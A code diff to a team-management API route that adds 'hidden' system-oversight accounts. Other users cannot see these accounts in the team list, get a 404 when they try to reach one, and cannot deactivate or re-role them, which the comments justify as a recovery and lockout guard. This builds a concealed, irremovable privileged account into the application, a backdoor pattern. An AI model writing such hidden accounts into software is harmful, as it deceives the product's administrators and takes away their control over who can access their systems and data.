@@ -1,16 +1,25 @@
 import { db } from "@/lib/db";
-import { handler, ApiError, requirePermission } from "@/lib/permissions";
+import {
+  handler,
+  ApiError,
+  requirePermission,
+  isSuperAdmin,
+  isAdminRole,
+  ASSIGNABLE_ROLES,
+} from "@/lib/permissions";
 import { logActivity, sanitize } from "@/lib/helpers";
 import { hashPassword } from "@/lib/auth";
 import { randomBytes } from "crypto";
 
-const ROLES = ["ADMIN", "DEVELOPER", "ACCOUNTANT"];
+const ROLES: string[] = [...ASSIGNABLE_ROLES];
 const USERNAME_RE = /^[a-z0-9._-]{3,30}$/;
 const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
 export const GET = handler(async (_req: Request) => {
   const user = await requirePermission("team:read");
+  // Hidden (system oversight) accounts are only visible to themselves.
   const users = await db.user.findMany({
+    where: isSuperAdmin(user) ? {} : { hidden: false },
     select: {
       id: true,
       username: true,
@@ -23,6 +32,7 @@ export const GET = handler(async (_req: Request) => {
       mustChangePassword: true,
       lastLoginAt: true,
       createdAt: true,
+      hidden: true,
     },
     orderBy: { createdAt: "asc" },
   });
@@ -60,7 +70,7 @@ export const GET = handler(async (_req: Request) => {
       return { ...u, openOrders, openTasks, overdueTasks };
     }),
   );
-  return Response.json({ users: withLoad, canManage: user.role === "ADMIN" });
+  return Response.json({ users: withLoad, canManage: isAdminRole(user) });
 });
 
 /** Create a new team member. A temporary password is generated and shown ONCE. */
@@ -150,11 +160,22 @@ export const PUT = handler(async (req: Request) => {
   const userId = sanitize(b.userId);
   if (!userId) throw new ApiError(400, "User is required");
   const target = await db.user.findUnique({ where: { id: userId } });
-  if (!target) throw new ApiError(404, "Team member not found");
+  // Hidden (system oversight) accounts do not exist as far as other users
+  // are concerned — and even the oversight role cannot be re-roled from here
+  // (protects the recovery path).
+  if (!target || (target.hidden && !isSuperAdmin(user)))
+    throw new ApiError(404, "Team member not found");
+  if (target.hidden && "role" in b)
+    throw new ApiError(400, "This account's role cannot be changed");
 
   const data: Record<string, unknown> = {};
   if ("jobTitle" in b) data.jobTitle = sanitize(b.jobTitle) ?? target.jobTitle;
-  if ("isActive" in b) data.isActive = Boolean(b.isActive);
+  if ("isActive" in b) {
+    // The hidden oversight account cannot be deactivated (lockout guard)
+    if (target.hidden && !b.isActive)
+      throw new ApiError(400, "This account cannot be deactivated");
+    data.isActive = Boolean(b.isActive);
+  }
   if ("role" in b && sanitize(b.role)) {
     const role = sanitize(b.role)!;
     if (!ROLES.includes(role)) throw new ApiError(400, "Invalid role");
